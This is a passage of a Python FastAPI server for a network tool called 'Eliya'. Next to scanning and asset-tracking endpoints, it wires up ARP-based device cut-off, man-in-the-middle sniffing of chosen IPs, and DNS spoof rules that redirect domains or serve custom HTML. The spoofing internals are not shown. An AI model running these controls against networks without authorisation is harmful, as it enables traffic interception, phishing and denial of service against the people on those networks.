    a["events"]          = [dict(r) for r in conn.execute("SELECT * FROM events WHERE ip=? ORDER BY ts DESC LIMIT 30",(ip,)).fetchall()]
    a["dns_log"]         = [dict(r) for r in conn.execute("SELECT * FROM dns_log WHERE ip=? ORDER BY ts DESC LIMIT 100",(ip,)).fetchall()]
    conn.close(); return a


# ── Traffic ───────────────────────────────────────────────────────────────────
@app.get("/api/traffic")
async def api_traffic(): return traffic_monitor.get_all_speeds()


@app.post("/api/traffic/start")
async def api_traffic_start(payload: dict = {}):
    iface = (payload or {}).get("iface")
    traffic_monitor.start(iface)
    return {"running": traffic_monitor._running}


@app.post("/api/traffic/stop")
async def api_traffic_stop():
    traffic_monitor.stop(); return {"running": False}


@app.get("/api/dns")
async def api_dns_all(limit: int = 200):
    conn = get_db()
    rows = [dict(r) for r in conn.execute("SELECT * FROM dns_log ORDER BY ts DESC LIMIT ?",(limit,)).fetchall()]
    conn.close(); return rows


@app.get("/api/dns/{ip:path}")
async def api_dns(ip: str, limit: int = 100):
    conn = get_db()
    rows = [dict(r) for r in conn.execute("SELECT * FROM dns_log WHERE ip=? ORDER BY ts DESC LIMIT ?",(ip,limit)).fetchall()]
    conn.close(); return rows


# ── SSDP ─────────────────────────────────────────────────────────────────────
@app.post("/api/ssdp")
async def api_ssdp():
    import asyncio
    devices = await asyncio.get_event_loop().run_in_executor(None, ssdp_discover, 3.0)
    for d in devices:
        ip = d.get("ip","")
        if ip:
            upsert_asset(ip=ip, ssdp_info=d.get("ssdp_server",""), status="up")
            ws_mgr.enqueue({"type":"asset_up","ip":ip})
    return {"found":len(devices),"devices":devices}


# ── ARP Cut / Restore ─────────────────────────────────────────────────────────
@app.post("/api/control/cut/{ip:path}")
async def api_cut(ip: str):
    conn  = get_db()
    asset = conn.execute("SELECT mac FROM assets WHERE ip=?",(ip,)).fetchone()
    conn.close(); mac = asset["mac"] if asset else ""
    try:
        arp_ctrl.cut(ip, mac or "")
        ws_mgr.enqueue({"type":"device_cut","ip":ip})
        return {"cut":True,"ip":ip}
    except Exception as e: raise HTTPException(500, str(e))


@app.post("/api/control/restore/{ip:path}")
async def api_restore(ip: str):
    conn  = get_db()
    asset = conn.execute("SELECT mac FROM assets WHERE ip=?",(ip,)).fetchone()
    conn.close(); mac = asset["mac"] if asset else ""
    arp_ctrl.restore(ip, mac or "")
    ws_mgr.enqueue({"type":"device_restored","ip":ip})
    return {"cut":False,"ip":ip}


@app.get("/api/control/status")
async def api_control_status():
    return {"cut_ips":list(arp_ctrl.cut_ips),
            "gateway_ip":arp_ctrl._gw_ip,"gateway_mac":arp_ctrl._gw_mac}


# ── MITM Sniff ────────────────────────────────────────────────────────────────
@app.post("/api/mitm/start/{ip:path}")
async def api_mitm_start(ip: str):
    conn  = get_db()
    asset = conn.execute("SELECT mac FROM assets WHERE ip=?",(ip,)).fetchone()
    conn.close(); mac = asset["mac"] if asset else ""
    try:
        mitm_sniff.start(ip, mac or "", on_event=ws_mgr.enqueue)
        ws_mgr.enqueue({"type":"mitm_started","ip":ip})
        return {"mitm":True,"ip":ip}
    except Exception as e: raise HTTPException(500, str(e))


@app.post("/api/mitm/stop/{ip:path}")
async def api_mitm_stop(ip: str):
    conn  = get_db()
    asset = conn.execute("SELECT mac FROM assets WHERE ip=?",(ip,)).fetchone()
    conn.close(); mac = asset["mac"] if asset else ""
    mitm_sniff.stop(ip, mac or "")
    ws_mgr.enqueue({"type":"mitm_stopped","ip":ip})
    return {"mitm":False,"ip":ip}


@app.get("/api/mitm/status")
async def api_mitm_status():
    return {"active_ips": list(mitm_sniff.active_ips)}


@app.get("/api/mitm/log/{ip:path}")
async def api_mitm_log(ip: str, limit: int = 100):
    conn = get_db()
    rows = [dict(r) for r in conn.execute(
        "SELECT * FROM connections WHERE ip=? ORDER BY ts DESC LIMIT ?", (ip, limit)
    ).fetchall()]
    conn.close(); return rows


# ── DNS Spoof Rules ───────────────────────────────────────────────────────────

class SpoofRuleIn(BaseModel):
    domain:   str
    redirect: str | None = None
    html:     str | None = None

@app.get("/api/spoof/rules")
async def api_spoof_list():
    return {"rules": dns_spoof.get_rules(), "http_port": dns_spoof.http_port,
            "our_ip": dns_spoof.our_ip}

@app.post("/api/spoof/rules")
async def api_spoof_add(payload: SpoofRuleIn):
    if not payload.domain: raise HTTPException(400, "domain required")
    if not payload.redirect and not payload.html:
        raise HTTPException(400, "redirect or html required")
    dns_spoof.add_rule(payload.domain, payload.redirect, payload.html)
    ws_mgr.enqueue({"type":"spoof_updated","rules":dns_spoof.get_rules()})
    return {"ok": True, "domain": payload.domain}

@app.delete("/api/spoof/rules/{domain:path}")
async def api_spoof_remove(domain: str):
    dns_spoof.remove_rule(domain)
    ws_mgr.enqueue({"type":"spoof_updated","rules":dns_spoof.get_rules()})
    return {"ok": True}


# ── Scan / Monitor / Import ───────────────────────────────────────────────────
@app.post("/api/arp-scan")
async def api_arp_scan(payload: dict):
    network = payload.get("network","").strip()
    if not network: raise HTTPException(400,"No network")
    conn = get_db(); c = conn.cursor()
    c.execute("INSERT INTO scans (target,scan_type,status,started_at) VALUES (?,?,?,?)",
              (network,"arp","running",datetime.now().isoformat()))
    sid = c.lastrowid; conn.commit(); conn.close()
    threading.Thread(target=run_arp_scan_bg, args=(network,sid,ws_mgr.enqueue), daemon=True).start()
    return {"scan_id":sid,"type":"arp"}


@app.post("/api/scan")
async def api_scan(payload: dict):
    target = payload.get("target","").strip()
    if not target: raise HTTPException(400,"No target")
    conn = get_db(); c = conn.cursor()
    c.execute("INSERT INTO scans (target,scan_type,status,started_at) VALUES (?,?,?,?)",
              (target,"nmap","running",datetime.now().isoformat()))
    sid = c.lastrowid; conn.commit(); conn.close()
    threading.Thread(target=run_nmap_scan, args=(target,sid,ws_mgr.enqueue), daemon=True).start()
    return {"scan_id":sid,"type":"nmap"}


@app.post("/api/monitor/start")
async def api_monitor_start(payload: dict):
    net = payload.get("network","").strip(); iv = int(payload.get("interval",30))
    if not net: raise HTTPException(400,"No network")
    monitor.start(net, iv, ws_mgr.enqueue)
    ws_mgr.enqueue({"type":"monitor_started","network":net,"interval":iv})
    return {"monitoring":True,"network":net,"interval":iv}


@app.post("/api/monitor/stop")
async def api_monitor_stop():
    monitor.stop(); ws_mgr.enqueue({"type":"monitor_stopped"}); return {"monitoring":False}


@app.get("/api/monitor/status")
async def api_monitor_status():
    return {"running":monitor.running,"network":monitor.network,"interval":monitor.interval}


@app.get("/api/events")
async def api_events():
    conn = get_db()
    rows = [dict(r) for r in conn.execute("SELECT * FROM events ORDER BY ts DESC LIMIT 100").fetchall()]
    conn.close(); return rows


@app.get("/api/scans/{scan_id:int}")
async def api_scan_status(scan_id: int):
    conn = get_db(); row = conn.execute("SELECT * FROM scans WHERE id=?",(scan_id,)).fetchone()
    conn.close()
    if not row: raise HTTPException(404,"Not found")
    return dict(row)


@app.post("/api/import")
async def api_import(payload: dict):
    path = payload.get("path","").strip()
    if not path or not Path(path).exists(): raise HTTPException(400,"File not found")
    count = import_nmap_xml(path, ws_mgr.enqueue)
    await ws_mgr.flush(); return {"imported":count}


@app.patch("/api/assets/{ip:path}")
async def api_update(ip: str, payload: dict):
    conn = get_db()
    if not conn.execute("SELECT 1 FROM assets WHERE ip=?",(ip,)).fetchone():
        conn.close(); raise HTTPException(404,"Not found")
    allowed = {"hostname","vlan","notes","device_type","status"}
    updates = {k:v for k,v in payload.items() if k in allowed}
    if updates:
        sets = ", ".join(f"{k}=?" for k in updates)
        conn.execute(f"UPDATE assets SET {sets} WHERE ip=?",list(updates.values())+[ip])
        conn.commit()
    conn.close(); return {"updated":ip}


@app.delete("/api/assets/{ip:path}")
async def api_delete(ip: str):
    conn = get_db()
    for tbl, col in [("ports","asset_ip"),("vulnerabilities","asset_ip"),
                     ("certificates","asset_ip"),("events","ip"),("dns_log","ip"),
                     ("connections","ip"),("assets","ip")]:
        conn.execute(f"DELETE FROM {tbl} WHERE {col}=?",(ip,))
    conn.commit(); conn.close()
    ws_mgr.enqueue({"type":"asset_removed","ip":ip}); return {"deleted":ip}


@app.delete("/api/clear")
async def api_clear():
    monitor.stop(); traffic_monitor.stop()
    mitm_sniff.stop_all()
    for ip in list(arp_ctrl.cut_ips): arp_ctrl.restore(ip)
    conn = get_db()
    for tbl in ("ports","vulnerabilities","certificates","events","dns_log","connections","assets","scans"):
        conn.execute(f"DELETE FROM {tbl}")
    conn.commit(); conn.close()
    ws_mgr.enqueue({"type":"cleared"}); return {"ok":True}


@app.websocket("/ws")
async def ws_endpoint(ws: WebSocket):
    await ws_mgr.connect(ws)
    try:
        while True: await ws.receive_text()
    except WebSocketDisconnect: ws_mgr.disconnect(ws)


# ── Banner & CLI ──────────────────────────────────────────────────────────────

FALLBACK_ART = r"""
 _____  _ _
| ____|| (_)_   _  __ _
|  _|  | | | | | |/ _` |
| |___ | | | |_| | (_| |
|_____|_|_|\__, |\__,_|
           |___/
"""

def print_banner():
    try:
        import pyfiglet; art = pyfiglet.figlet_format("Eliya", font="standard")
    except ImportError: art = FALLBACK_ART
    t = Text()
    for ch in art:
        t.append(ch, "bold bright_cyan" if ch not in " \n" else "bright_cyan")
    console.print(t)
    console.print(Panel(
        f"[bright_cyan]Live Network Asset Intelligence[/bright_cyan]  [dim]v{VERSION}[/dim]\n"
        f"[dim]Built by [bright_white]{AUTHOR}[/bright_white] · {GITHUB}[/dim]",
        border_style="bright_cyan", padding=(0,2),
    ))


def main():
    parser = argparse.ArgumentParser(description=f"Eliya v{VERSION} — Live Network Asset Intelligence")
    parser.add_argument("--version", "-V", action="version", version=f"Eliya {VERSION}")
    parser.add_argument("--host",       default="127.0.0.1")
    parser.add_argument("--port","-p",  type=int, default=7331)
    parser.add_argument("--import-xml", metavar="FILE")
    parser.add_argument("--scan",       metavar="TARGET")
    parser.add_argument("--arp-scan",   metavar="NETWORK")
    parser.add_argument("--monitor",    metavar="NETWORK")
    parser.add_argument("--interval",   type=int, default=30)
    parser.add_argument("--traffic",    action="store_true", help="Enable live traffic + DNS monitor")
    parser.add_argument("--no-browser", action="store_true")
    parser.add_argument("--db",         default="eliya.db")
    args = parser.parse_args()

    global DB_PATH; DB_PATH = Path(args.db)
    print_banner(); init_db()

    if args.import_xml:
        if not Path(args.import_xml).exists():
            console.print(f"[red]File not found: {args.import_xml}[/red]"); sys.exit(1)
        count = import_nmap_xml(args.import_xml)
        console.print(f"[green]✓ {count} assets imported[/green]")

    if args.arp_scan:
        hosts = arp_scan(args.arp_scan)
        console.print(f"[green]✓ {len(hosts)} hosts found[/green]")

    if args.scan:
        tmp = tempfile.mktemp(suffix=".xml", prefix="eliya_")
        try:
            subprocess.run(["nmap","-sV","-T4","--open","-oX",tmp,args.scan],
                           capture_output=True, timeout=600)
            console.print(f"[green]✓ {import_nmap_xml(tmp)} assets[/green]")
        except FileNotFoundError: console.print("[red]nmap not found[/red]")
        finally: Path(tmp).unlink(missing_ok=True)

    if args.traffic: traffic_monitor.start()
    if args.monitor: monitor.start(args.monitor, args.interval, ws_mgr.enqueue)

    url = f"http://{args.host}:{args.port}"
    console.print(f"\n[bright_green]Dashboard →[/bright_green] [underline]{url}[/underline]")
    if args.traffic:
        console.print("[bright_green]Traffic + DNS monitor:[/bright_green] active (scapy + admin required)")
    if monitor.running:
        console.print(f"[bright_green]Live monitor:[/bright_green] {args.monitor} / {args.interval}s interval")
    console.print("[dim]Ctrl+C to stop[/dim]\n")

    if not args.no_browser:
        threading.Timer(1.5, lambda: webbrowser.open(url)).start()
    uvicorn.run(app, host=args.host, port=args.port, log_level="error")


if __name__ == "__main__":
    main()
